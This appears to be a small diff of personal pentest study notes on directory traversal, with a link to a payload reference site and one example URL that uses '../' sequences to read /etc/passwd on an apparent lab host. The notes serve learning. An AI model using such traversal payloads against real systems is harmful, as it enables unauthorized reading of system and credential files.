@@ -1,7 +1,9 @@
 ## Directory Traversal
 
+### Links
 - [Payload All The Things DT](https://swisskyrepo.github.io/PayloadsAllTheThings/Directory%20Traversal/)
 
+### Directory Traversal Basics
 ```
 http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
 
